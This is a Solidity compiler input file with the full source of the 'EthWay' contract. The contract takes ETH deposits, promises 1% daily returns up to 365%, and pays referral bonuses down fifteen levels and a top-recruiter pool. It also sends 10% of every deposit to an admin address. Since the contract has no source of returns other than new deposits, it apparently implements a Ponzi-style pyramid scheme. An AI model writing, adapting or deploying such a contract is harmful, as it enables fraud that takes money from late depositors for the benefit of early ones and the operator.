{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/EthWay.sol": {
      "content": "/*! SPDX-License-Identifier: MIT License */\n\npragma solidity 0.6.8;\n\ncontract EthWay {\n    struct User {\n        uint256 cycle;\n        address upline;\n        uint256 referrals;\n        uint256 payouts;\n        uint256 direct_bonus;\n        uint256 pool_bonus;\n        uint256 match_bonus;\n        uint256 deposit_amount;\n        uint256 deposit_payouts;\n        uint40 deposit_time;\n        uint256 total_deposits;\n        uint256 total_payouts;\n        uint256 total_structure;\n    }\n\n    address payable public root;\n    address payable public admin_fee;\n\n    mapping(address => User) public users;\n\n    uint256[] public cycles;\n    uint8[] public ref_bonuses;                     // 1 => 1%\n\n    uint8[] public pool_bonuses;                    // 1 => 1%\n    uint40 public pool_last_draw = uint40(block.timestamp);\n    uint256 public pool_cycle;\n    uint256 public pool_balance;\n    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;\n    mapping(uint8 => address) public pool_top;\n\n    uint256 public total_users = 1;\n    uint256 public total_deposited;\n    uint256 public total_withdraw;\n    \n    event Upline(address indexed addr, address indexed upline);\n    event NewDeposit(address indexed addr, uint256 amount);\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount);\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\n    event PoolPayout(address indexed addr, uint256 amount);\n    event Withdraw(address indexed addr, uint256 amount);\n    event LimitReached(address indexed addr, uint256 amount);\n\n    constructor(address payable _root, address payable _admin_fee) public {\n        root = _root;\n        admin_fee = _admin_fee;\n        \n        ref_bonuses.push(50);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n        ref_bonuses.push(10);\t\n\n        pool_bonuses.push(40);\n        pool_bonuses.push(30);\n        pool_bonuses.push(20);\n        pool_bonuses.push(10);\n\n        cycles.push(10 ether);\n        cycles.push(30 ether);\n        cycles.push(90 ether);\n        cycles.push(200 ether);\n    }\n\n\treceive() payable external {\t\n        _deposit(msg.sender, msg.value);\t\n    }\n\n    function _setUpline(address _addr, address _upline) private {\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != root && (users[_upline].deposit_time > 0 || _upline == root)) {\n            users[_addr].upline = _upline;\n            users[_upline].referrals++;\n\n            emit Upline(_addr, _upline);\n\n            total_users++;\n\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\n                if(_upline == address(0)) break;\n\n                users[_upline].total_structure++;\n\n                _upline = users[_upline].upline;\n            }\n        }\n    }\n\n    function _deposit(address _addr, uint256 _amount) private {\n        require(users[_addr].upline != address(0) || _addr == root, \"No upline\");\n\n        if(users[_addr].deposit_time > 0) {\n            users[_addr].cycle++;\n            \n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\n            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], \"Bad amount\");\n        }\n        else require(_amount >= 0.1 ether && _amount <= cycles[0], \"Bad amount\");\n        \n        users[_addr].payouts = 0;\n        users[_addr].deposit_amount = _amount;\n        users[_addr].deposit_payouts = 0;\n        users[_addr].deposit_time = uint40(block.timestamp);\n        users[_addr].total_deposits += _amount;\n\n        total_deposited += _amount;\n        \n        emit NewDeposit(_addr, _amount);\n\n        if(users[_addr].upline != address(0)) {\n            users[users[_addr].upline].direct_bonus += _amount / 10;\n\n            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);\n        }\n\n        _pollDeposits(_addr, _amount);\n\n        if(pool_last_draw + 1 days < block.timestamp) {\n            _drawPool();\n        }\n\n        admin_fee.transfer(_amount / 10);\n    }\n\n    function _pollDeposits(address _addr, uint256 _amount) private {\n        pool_balance += _amount / 20;\n\n        address upline = users[_addr].upline;\n\n        if(upline == address(0)) return;\n        \n        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;\n\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\n            if(pool_top[i] == upline) break;\n\n            if(pool_top[i] == address(0)) {\n                pool_top[i] = upline;\n                break;\n            }\n\n            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {\n                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {\n                    if(pool_top[j] == upline) {\n                        for(uint8 k = j; k <= pool_bonuses.length; k++) {\n                            pool_top[k] = pool_top[k + 1];\n                        }\n                        break;\n                    }\n                }\n\n                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {\n                    pool_top[j] = pool_top[j - 1];\n                }\n\n                pool_top[i] = upline;\n\n                break;\n            }\n        }\n    }\n\n    function _refPayout(address _addr, uint256 _amount) private {\n        address up = users[_addr].upline;\n\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\n            if(up == address(0)) break;\n            \n            if(users[up].referrals >= i + 1) {\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\n                \n                users[up].match_bonus += bonus;\n\n                emit MatchPayout(up, _addr, bonus);\n            }\n\n            up = users[up].upline;\n        }\n    }\n\n    function _drawPool() private {\n        pool_last_draw = uint40(block.timestamp);\n        pool_cycle++;\n\n        uint256 draw_amount = pool_balance / 10;\n\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\n            if(pool_top[i] == address(0)) break;\n\n            uint256 win = draw_amount * pool_bonuses[i] / 100;\n\n            users[pool_top[i]].pool_bonus += win;\n            pool_balance -= win;\n\n            emit PoolPayout(pool_top[i], win);\n        }\n        \n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\n            pool_top[i] = address(0);\n        }\n    }\n\n    function deposit(address _upline) payable external {\n        _setUpline(msg.sender, _upline);\n        _deposit(msg.sender, msg.value);\n    }\n\n    function withdraw() external {\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\n        \n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\n\n        // Deposit payout\n        if(to_payout > 0) {\n            if(users[msg.sender].payouts + to_payout > max_payout) {\n                to_payout = max_payout - users[msg.sender].payouts;\n            }\n\n            users[msg.sender].deposit_payouts += to_payout;\n            users[msg.sender].payouts += to_payout;\n\n            _refPayout(msg.sender, to_payout);\n        }\n        \n        // Direct payout\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\n\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\n                direct_bonus = max_payout - users[msg.sender].payouts;\n            }\n\n            users[msg.sender].direct_bonus -= direct_bonus;\n            users[msg.sender].payouts += direct_bonus;\n            to_payout += direct_bonus;\n        }\n        \n        // Pool payout\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {\n            uint256 pool_bonus = users[msg.sender].pool_bonus;\n\n            if(users[msg.sender].payouts + pool_bonus > max_payout) {\n                pool_bonus = max_payout - users[msg.sender].payouts;\n            }\n\n            users[msg.sender].pool_bonus -= pool_bonus;\n            users[msg.sender].payouts += pool_bonus;\n            to_payout += pool_bonus;\n        }\n\n        // Match payout\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {\n            uint256 match_bonus = users[msg.sender].match_bonus;\n\n            if(users[msg.sender].payouts + match_bonus > max_payout) {\n                match_bonus = max_payout - users[msg.sender].payouts;\n            }\n\n            users[msg.sender].match_bonus -= match_bonus;\n            users[msg.sender].payouts += match_bonus;\n            to_payout += match_bonus;\n        }\n\n        require(to_payout > 0, \"Zero payout\");\n        \n        users[msg.sender].total_payouts += to_payout;\n        total_withdraw += to_payout;\n\n        payable(msg.sender).transfer(to_payout);\t\n\n        emit Withdraw(msg.sender, to_payout);\n\n        if(users[msg.sender].payouts >= max_payout) {\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\n        }\n    }\n    \n    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {\n        return _amount * 365 / 100;\n    }\n\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\n\n        if(users[_addr].deposit_payouts < max_payout) {\n            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;\n            \n            if(users[_addr].deposit_payouts + payout > max_payout) {\n                payout = max_payout - users[_addr].deposit_payouts;\n            }\n        }\n    }\n\n    /*\n        Only external call\n    */\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);\n    }\n\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);\n    }\n\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {\n        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);\n    }\n\n    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\n            if(pool_top[i] == address(0)) break;\n\n            addrs[i] = pool_top[i];\n            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];\n        }\n    }\n}"
    }
  }
}